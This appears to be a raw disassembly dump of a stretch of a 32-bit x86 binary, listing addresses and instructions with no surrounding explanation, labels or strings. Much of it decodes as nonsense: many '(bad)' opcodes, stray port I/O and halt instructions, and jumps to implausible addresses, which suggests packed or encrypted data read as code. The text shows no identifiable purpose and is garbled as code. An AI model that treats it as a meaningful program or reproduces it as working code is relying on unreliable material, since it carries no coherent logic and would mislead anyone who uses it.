  404fff:	xchg   esp,eax
  405000:	les    esi,FWORD PTR [edi]
  405002:	push   ds
  405003:	xchg   ebp,eax
  405004:	push   es
  405005:	xchg   ebp,eax
  405006:	pushf  
  405007:	or     edx,DWORD PTR [ecx]
  405009:	push   edx
  40500a:	cmp    dl,BYTE PTR [ebp+0x3c5480f6]
  405010:	out    dx,al
  405011:	xchg   esp,eax
  405012:	(bad)  
  405013:	call   DWORD PTR [eax-0x6b]
  405016:	add    dh,dh
  405018:	das    
  405019:	or     al,ch
  40501b:	dec    eax
  40501c:	mov    BYTE PTR [edi+edi*8-0xc7801a],dl
  405023:	fisubr WORD PTR [ebp+0x3db594]
	...
  405039:	add    BYTE PTR [eax],al
  40503b:	add    BYTE PTR [esp+edx*4+0x847ceff],ah
  405042:	call   0xffd539d2
  405047:	sar    BYTE PTR [esi],cl
  405049:	sub    al,BYTE PTR [eax]
  40504b:	inc    ebx
  40504c:	xor    eax,0xe2e17595
  405051:	dec    edx
  405052:	shl    DWORD PTR [esi+0x35b594a5],cl
  405058:	lods   al,BYTE PTR ds:[esi]
  405059:	xchg   esp,eax
  40505a:	inc    DWORD PTR [ecx-0x7100522f]
  405060:	int    0x4a
  405062:	pop    esp
  405063:	xchg   ch,al
  405065:	xchg   esp,eax
  405066:	call   0xffd4e4f4
  40506b:	ret    0x27a1
  40506e:	ja     0x40502e
  405070:	sti    
  405071:	jmp    edi
  405073:	shl    edx,1
  405075:	(bad)  
  405076:	jmp    FWORD PTR [edi-0x39]
  405079:	jecxz  0x405079
  40507b:	push   esi
  40507c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40507d:	cmp    BYTE PTR [ebp-0x6c3203],0xe9
  405084:	ds repnz addr16 retf 0x411d
  40508a:	add    BYTE PTR [esi],dh
  40508c:	outs   dx,DWORD PTR ds:[esi]
  40508d:	in     al,0xfe
  40508f:	lods   eax,DWORD PTR cs:[esi]
  405091:	test   al,0xd
  405093:	push   ecx
  405094:	cmp    al,BYTE PTR [eax]
  405096:	or     ebp,DWORD PTR [ecx]
  405098:	ss push es
  40509a:	lea    edi,[edx+ebp*8-0x6e]
  40509e:	dec    DWORD PTR [esi]
	...
  4050b4:	sub    BYTE PTR [ebx+0x8a300d0],dl
  4050ba:	(bad)  [ebp-0x2c]
  4050bd:	jp     0x405044
  4050bf:	xor    bh,ah
  4050c1:	outs   dx,DWORD PTR ds:[esi]
  4050c2:	call   DWORD PTR [eax+0x38]
  4050c5:	stos   BYTE PTR es:[edi],al
  4050c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050c7:	add    al,ah
  4050c9:	cmc    
  4050ca:	and    ecx,DWORD PTR [ebp-0x153a3]
  4050d0:	out    0xcc,eax
  4050d2:	(bad)  
  4050d3:	jne    0x40506d
  4050d5:	ja     0x40511c
  4050d7:	shl    DWORD PTR [edi+0x6f],cl
  4050da:	push   DWORD PTR [ebp-0x1c]
  4050dd:	outs   dx,DWORD PTR ds:[esi]
  4050de:	jne    0x4050e8
  4050e0:	js     0x405067
  4050e2:	sar    edi,cl
  4050e4:	out    0xcf,eax
  4050e6:	pop    edx
  4050e7:	leave  
  4050e8:	loop   0x4050f2
  4050ea:	add    BYTE PTR [ebp+0xb],dl
  4050ed:	pusha  
  4050ee:	add    esp,0xffff77b8
  4050f4:	adc    eax,0xb750fc49
  4050f9:	stc    
  4050fa:	or     edi,edi
  4050fc:	lods   eax,DWORD PTR ds:[esi]
  4050fd:	clc    
  4050fe:	sub    BYTE PTR [ecx+0x50],al
  405101:	ja     0x4050bd
  405103:	test   al,0x60
  405105:	dec    DWORD PTR [edx]
  405107:	rol    BYTE PTR [edi-0x78],0xe7
  40510b:	add    BYTE PTR [eax-0x1],dl
  40510e:	mov    BYTE PTR [ebp-0x18],0xfb
  405112:	(bad)  
  405113:	jmp    DWORD PTR [eax]
  405115:	mov    BYTE PTR [ebp-0xc],0x0
	...
  405129:	add    BYTE PTR [eax],al
  40512b:	add    BYTE PTR [edi+0x7],dh
  40512e:	add    BYTE PTR [eax],al
  405130:	or     bh,bh
  405132:	imul   eax,DWORD PTR [eax],0xf7ec8995
  405138:	outs   dx,DWORD PTR ds:[si]
  40513a:	push   eax
  40513b:	push   0x20
  40513d:	add    BYTE PTR [ebp-0xc],0xc0
  405141:	jg     0x4050c8
  405143:	hlt    
  405144:	cmp    edx,esi
  405146:	xchg   edx,eax
  405147:	dec    DWORD PTR [ecx-0x1107e6fe]
  40514d:	adc    ecx,DWORD PTR [edi+0x430c0e8]
  405153:	add    BYTE PTR [edx],dh
  405155:	jmp    0x3c205671
  40515a:	add    al,0x0
  40515c:	cmp    DWORD PTR [esi],esp
  40515e:	push   eax
  40515f:	in     al,dx
  405160:	into   
  405161:	mov    cl,0x92
  405163:	add    DWORD PTR [ebp-0x65],eax
  405166:	xchg   BYTE PTR [ebp-0x6d565b],bh
  40516c:	ss aad 0x8
  40516f:	(bad)  
  405170:	cld    
  405171:	rcr    BYTE PTR [esi-0x2c70ee4a],0x40
  405178:	cmp    DWORD PTR [eax+ecx*4],esi
  40517b:	hlt    
  40517c:	xchg   BYTE PTR [ecx-0x6e],bl
  40517f:	push   eax
  405180:	xchg   ecx,eax
  405181:	and    al,0x5b
  405183:	add    BYTE PTR [ecx],bh
  405185:	sahf   
  405186:	ret    
  405187:	je     0x405171
  405189:	xor    ecx,DWORD PTR [eax-0x6d869918]
  40518f:	push   eax
	...
  4051a4:	mov    ah,0x1b
  4051a6:	xchg   edi,eax
  4051a7:	neg    DWORD PTR [esi+0x9]
  4051aa:	xor    edi,edi
  4051ac:	int3   
  4051ad:	mov    ah,0x92
  4051af:	xor    eax,0x44efc4
  4051b4:	push   ecx
  4051b5:	xor    BYTE PTR [ebx-0x3c62c101],ch
  4051bb:	je     0x405145
  4051bd:	and    BYTE PTR [eax-0x6dc4d910],cl
  4051c3:	push   0xbea2a738
  4051c8:	push   ds
  4051c9:	push   ebp
  4051ca:	sti    
  4051cb:	out    0x7b,eax
  4051cd:	cmc    
  4051ce:	xchg   ecx,eax
  4051cf:	(bad)  
  4051d0:	mov    edx,0xe9f6400
  4051d5:	xchg   edx,eax
  4051d6:	push   ds
  4051d7:	add    al,0x84
  4051d9:	add    al,0x83
  4051db:	add    esi,esi
  4051dd:	or     esp,ecx
  4051df:	fwait
  4051e0:	push   ds
  4051e1:	scas   al,BYTE PTR es:[edi]
  4051e2:	push   es
  4051e3:	xchg   edx,eax
  4051e4:	rol    BYTE PTR [esi],cl
  4051e6:	xchg   ebx,eax
  4051e7:	add    al,0xde
  4051e9:	or     esp,ecx
  4051eb:	fwait
  4051ec:	sbb    ch,BYTE PTR [esi+0x4bce91ee]
  4051f2:	rcr    DWORD PTR [ecx+0x57de91c6],1
  4051f8:	leave  
  4051f9:	mov    esi,edx
  4051fb:	xchg   ecx,eax
  4051fc:	mov    dh,0xb
  4051fe:	loope  0x40519b
  405200:	hlt    
  405201:	lods   eax,DWORD PTR ds:[esi]
  405202:	(bad)  
  405203:	xchg   ecx,eax
  405204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405205:	dec    ebx
  405206:	mov    ecx,0x99
	...
  40521b:	add    BYTE PTR [esi+0x6c0dc191],bl
  405221:	xchg   ecx,eax
  405222:	scas   al,BYTE PTR es:[edi]
  405223:	xchg   ecx,eax
  405224:	hlt    
  405225:	xchg   edi,eax
  405226:	nop
  405227:	fadd   QWORD PTR [edi+0x4919e91]
  40522d:	xchg   esp,eax
  40522e:	add    edi,0xbae9009e
  405234:	jnp    0x40523e
  405236:	jmp    0x68e50471
  40523b:	enter  0x8955,0x76
  40523f:	xchg   ecx,eax
  405240:	les    edi,FWORD PTR [ebx]
  405242:	ins    DWORD PTR es:[edi],dx
  405243:	xor    al,0x4e
  405245:	or     esi,ebp
  405247:	nop
  405248:	or     al,0xb
  40524a:	adc    BYTE PTR [ebx+0x39],al
  40524d:	test   al,0x85
  40524f:	imul   edi,DWORD PTR [ecx],0x3ec3e200
  405255:	jnp    0x4051f1
  405257:	add    bh,BYTE PTR [ecx]
  405259:	add    BYTE PTR [esi],ah
  40525b:	inc    edi
  40525c:	and    DWORD PTR [eax],eax
  40525e:	add    cl,ch
  405260:	cmp    al,BYTE PTR [eax]
  405262:	(bad)  
  405263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405265:	nop
  405266:	pop    es
  405267:	jmp    0x934078a6
  40526c:	cmp    ah,BYTE PTR [esi]
  40526e:	add    BYTE PTR [ebx+0x1545833a],al
  405274:	and    eax,0xc1fd8583
  405279:	nop
  40527a:	call   FWORD PTR [ecx-0x907f537]
	...
  405294:	das    
  405295:	xchg   esp,eax
  405296:	call   0x40b40a
  40529b:	repnz cli 
  40529d:	or     eax,DWORD PTR ds:0xffffc0d0
  4052a3:	call   0x2868ecfa
  4052a8:	xor    eax,0xc2f57591
  4052ad:	pop    esi
  4052ae:	fdivr  DWORD PTR [esi-0x6674d037]
  4052b4:	pop    ss
  4052b5:	jnp    0x4052ab
  4052b7:	mov    dh,0xa9
  4052b9:	nop
  4052ba:	push   eax
  4052bb:	cmp    esp,DWORD PTR [ebp-0x56612792]
  4052c1:	xchg   BYTE PTR [ebp-0x6f2e67],al
  4052c7:	and    DWORD PTR [ecx+0x4486ffab],0x8aca6800
  4052d1:	aas    
  4052d2:	add    BYTE PTR [esi-0x11],dh
  4052d5:	(bad)  
  4052d6:	imul   DWORD PTR [esi-0x57]
  4052d9:	nop
  4052da:	xor    eax,0x3f63dc
  4052df:	push   ecx
  4052e0:	xchg   ecx,eax
  4052e1:	test   al,0xff
  4052e3:	push   esi
  4052e4:	mov    bl,0x85
  4052e6:	in     al,0x56
  4052e8:	leave  
  4052e9:	(bad)
  4052ed:	in     al,dx
  4052ee:	sub    esi,DWORD PTR [eax]
  4052f0:	rol    DWORD PTR [ebx],1
  4052f2:	push   DWORD PTR [ebp-0x97b0]
	...
  40530c:	pop    edi
  40530d:	mov    dh,0x74
  40530f:	sub    ecx,edx
  405311:	add    ebp,eax
  405313:	leave  
  405314:	inc    edi
  405315:	jo     0x405316
  405317:	mov    DWORD PTR [ebp+0x6f],esp
  40531a:	idiv   edi
  40531c:	aas    
  40531d:	in     eax,dx
  40531e:	jmp    DWORD PTR [edi-0x5b]
  405321:	mov    bl,0x40
  405323:	add    bh,bl
  405325:	xor    eax,0x7fcff7f0
  40532a:	push   DWORD PTR ds:0x40aa45
  405330:	call   0xe0402a60
  405335:	or     eax,0x7f97e885
  40533a:	inc    DWORD PTR [ebx-0x8a743]
  405340:	jg     0x405346
  405342:	je     0x40538d
  405344:	adc    esi,DWORD PTR [ecx]
  405346:	in     al,dx
  405347:	test   edi,0x6074007f
  40534d:	cmp    DWORD PTR [ebp-0x805818],0x0
  405354:	and    al,0xb7
  405356:	add    BYTE PTR [bx+si+0x6e],ah
  40535a:	mov    esi,0xe78c45ff
  40535f:	out    dx,al
  405360:	sar    BYTE PTR [edi-0x1],0xff
  405364:	and    eax,0xcffff760
  405369:	jle    0x4053e0
  40536b:	or     BYTE PTR [eax+0xffd142],bh
	...
  405381:	add    BYTE PTR [eax],al
  405383:	add    bh,bl
  405385:	jle    0x40533c
  405387:	call   0x3fd273
  40538c:	cmp    DWORD PTR [ebx+edi*8-0x71379a19],ebp
  405393:	jmp    DWORD PTR [esi]
  405395:	or     al,0xa8
  405397:	neg    DWORD PTR [esi]
  405399:	into   
  40539a:	mov    ?,WORD PTR [ebp+0x41]
  40539d:	inc    ecx
  40539e:	out    0xd0,al
  4053a0:	push   cs
  4053a1:	fimul  WORD PTR [esi-0x7111e24b]
  4053a7:	call   DWORD PTR [ecx]
  4053a9:	test   eax,0xf5f6ffb7
  4053ae:	pop    eax
  4053af:	in     al,dx
  4053b0:	out    0xfd,al
  4053b2:	mov    gs,eax
  4053b4:	sbb    al,0xed
  4053b6:	mov    ?,edi
  4053b8:	(bad)  
  4053ba:	fwait
  4053bb:	not    esi
  4053bd:	xchg   ebp,eax
  4053be:	fwait
  4053bf:	sbb    ah,ch
  4053c1:	popf   
  4053c2:	mov    ?,edi
  4053c4:	mov    WORD PTR [eax-0x5241006a],gs
  4053ca:	sbb    BYTE PTR [eax],cl
  4053cc:	mov    eax,ds:0xaeff8d7b
  4053d1:	mov    ebp,0xc5aef058
  4053d6:	mov    gs,eax
  4053d8:	cmp    BYTE PTR [ebp-0x72],dh
  4053db:	call   DWORD PTR [esi-0x32167425]
  4053e1:	pop    esi
  4053e2:	mov    ?,edi
  4053e4:	xchg   bl,ch
  4053e6:	(bad)
	...
  4053fa:	add    BYTE PTR [eax],al
  4053fc:	repnz inc esi
  4053fe:	add    eax,DWORD PTR [eax]
  405400:	sbb    BYTE PTR [edx-0x5],0xff
  405404:	add    eax,0x7d839f22
  405409:	test   BYTE PTR [ecx],bl
  40540b:	add    bl,dl
  40540d:	xchg   edi,eax
  40540e:	mov    ?,WORD PTR [ebp+0x41]
  405411:	xor    edx,0x7c1d4ed0
  405417:	inc    ebp
  405418:	inc    ebp
  405419:	call   eax
  40541b:	jb     0x40542b
  40541d:	inc    ecx
  40541e:	jmp    0x413900b1
  405423:	daa    
  405424:	das    
  405425:	mov    cs,WORD PTR [esi+0x1b]
  405428:	jmp    0x405407
  40542a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40542b:	add    ebx,DWORD PTR [esi]
  40542d:	adc    al,0xf1
  40542f:	fwait
  405430:	outs   dx,BYTE PTR ds:[esi]
  405431:	mov    ?,WORD PTR [esi]
  405433:	mov    fs,WORD PTR [ecx+0x3944feb2]
  405439:	lea    ebx,[ebx+edi*8-0x71e432ea]
  405440:	neg    BYTE PTR [eax]
  405442:	adc    ebx,esi
  405444:	jns    0x405446
  405446:	push   cs
  405447:	sbb    BYTE PTR [ecx],dh
  405449:	cwde   
  40544a:	(bad)  
  40544b:	nop
  40544c:	fimul  WORD PTR [ebp-0x722ae802]
  405452:	jl     0x40544f
  405454:	(bad)  
  405455:	cmc    
  405456:	pop    ss
  405457:	mov    es,esi
  405459:	mov    bh,0xab
  40545b:	or     BYTE PTR [ecx],bh
  40545d:	xor    esi,DWORD PTR [edx-0x60]
	...
  405474:	and    DWORD PTR [eax],eax
  405476:	jmp    0x54ce4417
  40547b:	add    BYTE PTR [esi+0xd9bf113],ah
  405481:	xchg   ebx,eax
  405482:	mov    esi,0xe1c2808d
  405487:	add    esp,esp
  405489:	js     0x405448
  40548b:	add    DWORD PTR [esp+edi*8],0xe2bafce8
  405492:	out    0x3,eax
  405494:	cmp    DWORD PTR [ebp+0x2a61001c],ecx
  40549a:	scas   eax,DWORD PTR es:[edi]
  40549b:	lea    esp,[esi-0x7]
  40549e:	test   al,0x17
  4054a0:	dec    ecx
  4054a1:	sbb    BYTE PTR [edi-0x624],al
  4054a7:	jne    0x4054cf
  4054a9:	cld    
  4054aa:	out    0x22,eax
  4054ac:	mov    WORD PTR [ebp-0x4098f01],cs
  4054b2:	imul   ebp,ecx,0xa8302d52
  4054b8:	cmp    bl,BYTE PTR [eax]
  4054ba:	push   0x19
  4054bc:	jp     0x4054be
  4054be:	(bad)  
  4054bf:	cld    
  4054c0:	inc    edi
  4054c1:	xlat   BYTE PTR ds:[ebx]
  4054c2:	inc    eax
  4054c3:	jmp    0x37168a7a
  4054c8:	mov    esp,0x14b5bff8
  4054cd:	cmp    eax,0xfc262650
  4054d2:	out    0x2e,eax
  4054d4:	scas   eax,DWORD PTR es:[edi]
  4054d5:	mov    edi,?
  4054d7:	mov    ecx,0x0
	...
  4054ec:	sub    cl,BYTE PTR [ebp+0x6ec2e175]
  4054f2:	inc    DWORD PTR [esi]
  4054f4:	lods   al,BYTE PTR ds:[esi]
  4054f5:	xchg   edi,eax
  4054f6:	and    DWORD PTR [edx],ebx
  4054f8:	les    ecx,FWORD PTR [eax+ebp*8-0x73762b]
  4054ff:	cmp    DWORD PTR [edx],0x18
  405502:	pop    edi
  405503:	sbb    DWORD PTR [edx+0x0],edi
  405506:	push   0x3f8d53
  40550b:	inc    ecx
  40550c:	cmp    eax,DWORD PTR [eax]
  40550e:	add    BYTE PTR [ecx-0x3e],ch
  405511:	in     eax,dx
  405512:	aad    0xc6
  405514:	lods   eax,DWORD PTR ds:[esi]
  405515:	clc    
  405516:	mov    edi,0x503ca735
  40551b:	mov    dh,0x27
  40551d:	cld    
  40551e:	out    0x56,eax
  405520:	int3   
  405521:	mov    edi,?
  405523:	cmp    DWORD PTR [ebp-0x73],eax
  405526:	jne    0x405519
  405528:	shl    BYTE PTR [esi],cl
  40552a:	call   DWORD PTR [esi-0x44166843]
  405530:	mov    ch,0x8c
  405532:	call   0xff8f0137
  405537:	jmp    FWORD PTR [edx]
  405539:	add    al,0x68
  40553b:	pop    edi
  40553c:	nop
  40553d:	inc    ecx
  40553e:	add    BYTE PTR [eax-0x1b],ch
  405541:	mov    al,0x40
  405543:	add    bh,dl
  405545:	mov    ch,0x74
  405547:	sub    ecx,esp
  405549:	jmp    edi
  40554b:	in     eax,0x6d
  40554d:	jl     0x40554e
  40554f:	or     eax,DWORD PTR [eax]
	...
  405561:	add    BYTE PTR [eax],al
  405563:	add    BYTE PTR [eax-0xd],dl
  405566:	sbb    eax,0x757cc050
  40556b:	or     al,0x68
  40556d:	fst    st(5)
  40556f:	inc    DWORD PTR [edi-0x31]
  405572:	dec    edi
  405573:	dec    ebp
  405575:	xchg   edi,esp
  405577:	and    BYTE PTR [edi+0x7c],dl
  40557a:	(bad)  
  40557b:	call   0x3fa710
  405580:	cmp    BYTE PTR [eax],ch
  405582:	sar    bh,cl
  405584:	aaa    
  405585:	jmp    0xafd7bd89
  40558a:	inc    eax
  40558b:	add    BYTE PTR [eax-0x1fbecff6],ch
  405591:	out    0x1,eax
  405593:	add    al,dl
  405595:	jg     0x40557f
  405597:	lods   eax,DWORD PTR ds:[esi]
  405598:	jge    0x405611
  40559a:	dec    DWORD PTR [ebx]
  40559c:	loopne 0x40558e
  40559e:	sbb    eax,0x75777050
  4055a3:	or     al,0x78
  4055a5:	sahf   
  4055a6:	aad    0xff
  4055a8:	ja     0x40557e
  4055aa:	dec    edi
  4055ab:	dec    DWORD PTR [ebp-0x74]
  4055ae:	out    0xe8,eax
  4055b0:	(bad)  
  4055b1:	ja     0x4055b2
  4055b3:	call   0x3fa800
  4055b8:	test   al,0xf3
  4055ba:	sar    edi,1
  4055bc:	xlat   BYTE PTR ds:[ebx]
  4055bd:	in     al,dx
  4055be:	xor    BYTE PTR ds:[ecx],bh
  4055c1:	fadd   DWORD PTR [ebx]
  4055c3:	(bad)  
  4055c4:	in     al,dx
  4055c5:	lods   al,BYTE PTR ds:[esi]
  4055c6:	fwait
  4055c7:	add    eax,0x0
	...
  4055dc:	xchg   DWORD PTR [edx+0x9e9508b],eax
  4055e2:	adc    DWORD PTR [eax],ecx
  4055e4:	popa   
  4055e5:	pop    edx
  4055e6:	mov    bh,bh
  4055e8:	inc    esi
  4055e9:	xor    DWORD PTR [ebx],0x8b223ed2
  4055ef:	jne    0x405636
  4055f1:	xor    DWORD PTR [ebx],edi
  4055f3:	shr    BYTE PTR [esi],cl
  4055f5:	xor    bh,BYTE PTR [ebp+0x309931c2]
  4055fb:	mov    ecx,DWORD PTR ds:0xa3f4c016
  405601:	cdq    
  405602:	sbb    eax,0xfb4c0e02
  405607:	out    0x88,eax
  405609:	jmp    0x6887:0x5bb0ff8a
  405610:	cmp    al,0x98
  405612:	add    eax,DWORD PTR [eax]
  405614:	loope  0x40566b
  405616:	mov    ch,0xff
  405618:	out    0x1f,al
  40561a:	inc    ecx
  40561b:	clc    
  40561c:	push   ecx
  40561d:	popf   
  40561e:	add    al,0x0
  405620:	cmp    DWORD PTR [edx-0x1f1e07f0],ecx
  405626:	data16 add BYTE PTR [ecx],bh
  405629:	sahf   
  40562a:	ret    
  40562b:	je     0x405652
  40562d:	in     al,0xff
  40562f:	add    BYTE PTR [ecx],bh
  405631:	cdq    
  405632:	adc    cl,BYTE PTR ds:0xff8c2bae
  405638:	sub    al,0xa1
  40563a:	fwait
  40563b:	mov    BYTE PTR [edi+0xeb8ac1],bl
	...
  405651:	add    BYTE PTR [eax],al
  405653:	add    BYTE PTR [ecx+0x4a],al
  405656:	adc    al,bh
  405658:	mov    eax,ds:0x86ffb454
  40565d:	ds fsubr st(7),st
  405660:	cmc    
  405661:	(bad)  
  405662:	mov    esi,0x9e2f768a
  405667:	adc    BYTE PTR [ecx-0x68],al
  40566a:	pop    es
  40566b:	mov    ah,BYTE PTR [esi-0x76]
  40566e:	add    ebp,esi
  405670:	push   esi
  405671:	rcr    DWORD PTR [esi-0x5709a976],cl
  405677:	(bad)  
  405679:	sbb    BYTE PTR [edx],ah
  40567b:	aam    0xf9
  40567d:	call   FWORD PTR [eax]
  40567f:	pushf  
  405680:	jo     0x405636
  405682:	data16 mov cl,BYTE PTR [ecx+0x16fbd489]
  405689:	cmp    dl,BYTE PTR [edi-0x76]
  40568c:	es pop ss
  40568e:	or     bl,BYTE PTR [esp+eax*2+0x428a46b2]
  405695:	shl    BYTE PTR [ebp-0x6ca6911],0x44
  40569c:	cmp    DWORD PTR [eax],esi
  40569e:	inc    ecx
  40569f:	pop    ebp
  4056a0:	in     al,0x89
  4056a2:	es xor esi,esi
  4056a5:	adc    esi,ecx
  4056a7:	fwait
  4056a8:	sub    DWORD PTR [edx-0x13ac75ea],ecx
  4056ae:	add    BYTE PTR [ecx-0x1f975fc],dl
  4056b4:	xchg   esi,eax
  4056b5:	adc    al,0xd5
  4056b7:	sbb    eax,DWORD PTR [eax]
	...
  4056c9:	add    BYTE PTR [eax],al
  4056cb:	add    BYTE PTR [edx+0x6903a7d0],al
  4056d1:	cwde   
  4056d2:	bound  esi,QWORD PTR [eax-0x76c67642]
  4056d8:	sub    al,0xf8
  4056da:	shl    bl,1
  4056dc:	lods   al,BYTE PTR ds:[esi]
  4056dd:	mov    esi,edx
  4056df:	push   ds
  4056e0:	cmp    DWORD PTR [eax],ebx
  4056e2:	xor    eax,0x50fff9d4
  4056e7:	push   ds
  4056e8:	dec    ecx
  4056e9:	aas    
  4056ea:	jmp    0x539b77
  4056ef:	add    dl,bh
  4056f1:	jmp    edi
  4056f3:	pop    ecx
  4056f4:	leave  
  4056f5:	mov    edi,edi
  4056f7:	cmp    eax,eax
  4056f9:	adc    ecx,DWORD PTR [eax]
  4056fb:	xchg   ecx,eax
  4056fc:	retf   0xff8b
  4056ff:	xchg   esi,eax
  405700:	inc    edi
  405701:	add    BYTE PTR [eax+0x2e],ch
  405704:	test   DWORD PTR [eax+0x0],eax
  405707:	adc    DWORD PTR [edi],esi
  405709:	rol    BYTE PTR [eax-0x17],1
  40570c:	rcl    ebx,0x74
  40570f:	sar    bl,0xff
  405712:	out    0xf9,eax
  405714:	mov    cs,WORD PTR [ecx+0x13faf2ff]
  40571a:	push   ss
  40571b:	jo     0x40578b
  40571d:	xchg   esp,eax
  40571e:	(bad)  
  40571f:	fdiv   QWORD PTR [esi-0x3d1e8a78]
  405725:	dec    esi
  405726:	std    
  405727:	inc    esi
  405728:	ror    BYTE PTR [eax-0x3652ca8b],0xd0
  40572f:	add    BYTE PTR ss:[eax],al
	...
  405742:	add    BYTE PTR [eax],al
  405744:	mov    al,0x15
  405746:	add    cl,al
  405748:	dec    esi
  405749:	rol    BYTE PTR [eax-0x17],1
  40574c:	push   edx
  40574d:	jnp    0x40577f
  40574f:	test   al,0x3a
  405751:	mov    DWORD PTR ds:0x40039c,esi
  405757:	add    eax,esi
  405759:	lods   al,BYTE PTR ds:[esi]
  40575a:	inc    DWORD PTR [esi]
  40575c:	or     eax,0xb2f17589
  405761:	pop    edi
  405762:	std    
  405763:	div    BYTE PTR [ecx+0x11810015]
  405769:	rol    BYTE PTR [eax-0x17],1
  40576c:	push   edx
  40576d:	jnp    0x40579f
  40576f:	sub    BYTE PTR ds:0x825c3589,dh
  405775:	aas    
  405776:	add    cl,al
  405778:	xchg   ecx,eax
  405779:	lods   al,BYTE PTR ds:[esi]
  40577a:	inc    DWORD PTR [eax]
  40577c:	jg     0x405709
  40577e:	mov    edi,0x45056674
  405783:	hlt    
  405784:	iret   
  405785:	stc    
  405786:	repz inc DWORD PTR [ebp-0x74]
  40578a:	out    0x60,eax
  40578c:	popf   
  40578d:	ja     0x40578e
  40578f:	inc    DWORD PTR [ebp+0x70]
  405792:	call   0xffb7f884
  405797:	push   0x50
  405799:	in     al,0x53
  40579b:	xor    BYTE PTR [ecx],ah
  40579d:	add    al,0x68
  40579f:	push   0xffffff90
  4057a1:	cmp    eax,0xfc526800
  4057a6:	(bad)  
  4057a7:	jg     0x4057a9
	...
  4057b9:	add    BYTE PTR [eax],al
  4057bb:	add    BYTE PTR [eax-0x60002c99],bh
  4057c1:	sar    esi,cl
  4057c3:	jne    0x4057ed
  4057c5:	ins    BYTE PTR es:[edi],dx
  4057c6:	push   eax
  4057c7:	std    
  4057c8:	(bad)  
  4057c9:	js     0x405835
  4057cb:	add    al,bh
  4057cd:	fsubr  DWORD PTR [edi]
  4057cf:	inc    ecx
  4057d0:	and    ah,ch
  4057d2:	imul   esi,DWORD PTR [eax],0x26803e1
  4057d8:	adc    BYTE PTR [eax+eax*4],al
  4057db:	call   0x3fa400
  4057e0:	jmp    0x4057a5
  4057e2:	je     0x4057fa
  4057e4:	imul   eax,esi,0x77c5fff3
  4057ea:	push   DWORD PTR [ebp-0x28]
  4057ed:	imul   edx,DWORD PTR [ecx],0xfffffffd
  4057f0:	aas    
  4057f1:	js     0x4057f2
  4057f3:	jne    0x4057b9
  4057f5:	push   0xffffff9e
  4057f7:	ror    bh,1
  4057f9:	jg     0x405865
  4057fb:	add    BYTE PTR [eax-0x5fbed029],bh
  405801:	jmp    0x40578f
  405803:	xor    BYTE PTR [ecx-0x4],ah
  405806:	add    bh,BYTE PTR [bx+di]
  405809:	cdq    
  40580a:	add    eax,DWORD PTR [eax-0x4c866f]
  405810:	xchg   esi,eax
  405811:	jmp    0xb181cd9c
  405816:	add    eax,0x1a4e86fd
  40581b:	add    BYTE PTR [ecx],dl
  40581d:	not    bl
  40581f:	inc    eax
	...
  405834:	cmp    ecx,esi
  405836:	js     0x405868
  405838:	clc    
  405839:	cwde   
  40583a:	sbb    eax,DWORD PTR [edx]
  40583c:	cmp    DWORD PTR [ecx+0x4ab8e883],ebx
  405842:	xchg   edi,edi
  405844:	inc    edx
  405845:	pop    ecx
  405846:	adc    BYTE PTR [esi],dl
  405848:	rcr    ah,0x8f
  40584b:	dec    esp
  40584d:	add    al,0x87
  40584f:	jne    0x405882
  405851:	add    edx,0x871e36fc
  405857:	jne    0x40587e
  405859:	xor    DWORD PTR [edi],esi
  40585b:	shl    BYTE PTR [esi],1
  40585d:	xchg   DWORD PTR cs:[ebp+0x1d],esi
  405861:	adc    DWORD PTR ss:[eax],ecx
  405864:	and    ebx,ebx
  405866:	mov    eax,0xc1d00eff
  40586b:	add    al,0x39
  40586d:	fs jp  0x40585c
  405870:	xchg   ecx,eax
  405871:	cdq    
  405872:	add    ebp,edi
  405874:	mov    bh,0xdd
  405876:	adc    BYTE PTR [esi+ebp*8],cl
  405879:	imul   edi,ebx,0xffffffe7
  40587c:	dec    esi
  40587d:	jmp    0x405805
  40587f:	push   eax
  405881:	(bad)  
  405883:	jmp    FWORD PTR [ebp+0x12]
  405886:	cwde   
  405887:	xor    ebp,0xc6ff85cc
  40588d:	aad    0x80
  40588f:	mov    eax,0x8695bf
  405894:	cmp    DWORD PTR [eax],eax
  405896:	jmp    0x40589e
	...
  4058ab:	add    dl,al
  4058ad:	cmp    al,0xed
  4058af:	cli    
  4058b0:	out    0xb,al
  4058b2:	in     al,dx
  4058b3:	and    DWORD PTR [ecx+0x0],0x54
  4058b7:	add    DWORD PTR [eax+0x3903e828],esp
  4058bd:	xchg   DWORD PTR [eax+edi*8],esi
  4058c0:	sahf   
  4058c1:	xchg   ebp,eax
  4058c2:	xchg   ebx,eax
  4058c3:	xchg   BYTE PTR [esi-0x6],bh
  4058c6:	test   al,0x10
  4058c8:	inc    esi
  4058c9:	sbb    BYTE PTR [esi-0x62000629],bh
  4058cf:	adc    BYTE PTR ds:0x5eb26298,dh
  4058d5:	xchg   BYTE PTR [edx-0x2a5c2108],al
  4058db:	inc    esp
  4058dc:	cmp    DWORD PTR [edi+0x35ef7f4],eax
  4058e2:	call   0x374b:0x64783e86
  4058e9:	xchg   BYTE PTR [esi+0x1b],ah
  4058ec:	outs   dx,DWORD PTR ds:[esi]
  4058ed:	(bad)  
  4058ee:	call   0x2bbc0cf6
  4058f3:	test   DWORD PTR [esi],ebx
  4058f5:	xchg   BYTE PTR [ecx+0x46b60d9b],bh
  4058fb:	xchg   BYTE PTR [ebx+edi*2-0x79f97ad5],bh
  405902:	cdq    
  405903:	xchg   ah,al
  405905:	dec    eax
  405906:	das    
  405907:	xchg   dh,dh
  405909:	cwde   
  40590a:	fldenv [ecx+edi*1+0x0]
  40590e:	jo     0x405890
	...
  405924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405925:	xchg   BYTE PTR [esi],dl
  405927:	xchg   BYTE PTR [ecx-0xb],bh
  40592a:	mov    bh,BYTE PTR fs:[ecx]
  40592d:	add    cl,ch
  40592f:	js     0x4058d5
  405931:	ret    0x85ff
  405934:	(bad)  
  405935:	lea    eax,[eax]
  405937:	jmp    0x405903
  405939:	test   edi,edi
  40593b:	jmp    0x2bcd7486
  405940:	xchg   ecx,eax
  405941:	xor    eax,0x4081bb68
  405946:	add    cl,al
  405948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
